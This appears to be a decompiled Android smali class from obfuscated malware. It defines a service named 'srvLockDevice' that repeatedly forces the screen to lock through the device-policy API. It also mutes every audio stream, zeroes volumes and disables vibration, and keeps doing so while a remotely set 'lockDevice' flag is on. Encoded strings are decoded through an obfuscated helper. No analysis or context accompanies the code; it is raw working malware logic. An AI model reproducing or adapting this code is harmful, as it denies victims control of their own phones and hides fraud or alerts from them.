.class public final Lcom/cisojemopatude/yazi/nopofoyuwure/nagodehevazuyi;
.super Landroid/app/IntentService;
.source ""


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, "srvLockDevice"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    return-void
.end method


# virtual methods
.method public onHandleIntent(Landroid/content/Intent;)V
    .locals 3

    :cond_0
    :try_start_0
    sget-object p1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v0, 0x64

    invoke-virtual {p1, v0, v1}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    const-string p1, "device_policy"

    .line 1
    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    if-eqz p1, :cond_1

    check-cast p1, Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {p1}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    goto :goto_0

    :cond_1
    new-instance p1, Ljava/lang/NullPointerException;

    const-string v0, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager"

    invoke-direct {p1, v0}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw p1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :try_start_2
    const-string p1, "UnJ2ZHVOTUYvZTFQUE9OZXA4ZHBDdz09OjprTlBJeVVIcWY3LzNSTjV2UHNKajlRPT0="

    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    const-string p1, "aWJSQXNENy9ENVNmOVpKSUI3Y2FsUT09OjptTXlwNzFrVlRtNGQ1Qm5jYitOaHFBPT0="

    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 2
    sget-object p1, Lb0/b;->a:Lb0/b;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :goto_0
    :try_start_3
    const-string p1, "audio"

    .line 3
    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    if-eqz p1, :cond_2

    check-cast p1, Landroid/media/AudioManager;

    const/4 v0, 0x1

    invoke-virtual {p1, v0, v0}, Landroid/media/AudioManager;->setStreamMute(IZ)V

    const/4 v1, 0x3

    invoke-virtual {p1, v1, v0}, Landroid/media/AudioManager;->setStreamMute(IZ)V

    const/4 v1, 0x4

    const/4 v2, 0x0

    invoke-virtual {p1, v1, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    const/16 v1, 0x8

    invoke-virtual {p1, v1, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    const/4 v1, 0x5

    invoke-virtual {p1, v1, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    const/4 v1, 0x2

    invoke-virtual {p1, v1, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    invoke-virtual {p1, v0, v2}, Landroid/media/AudioManager;->setVibrateSetting(II)V

    goto :goto_1

    :cond_2
    new-instance p1, Ljava/lang/NullPointerException;

    const-string v0, "null cannot be cast to non-null type android.media.AudioManager"

    invoke-direct {p1, v0}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw p1
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 4
    :catch_1
    :goto_1
    :try_start_4
    sget-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p1}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v0, "lockDevice"

    const-string v1, ""

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_3

    goto :goto_2

    :cond_3
    move-object v1, p1

    .line 5
    :goto_2
    const-string p1, "1"

    invoke-static {v1, p1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    if-nez p1, :cond_0

    :catch_2
    invoke-virtual {p0}, Landroid/app/IntentService;->stopSelf()V

    return-void
.end method
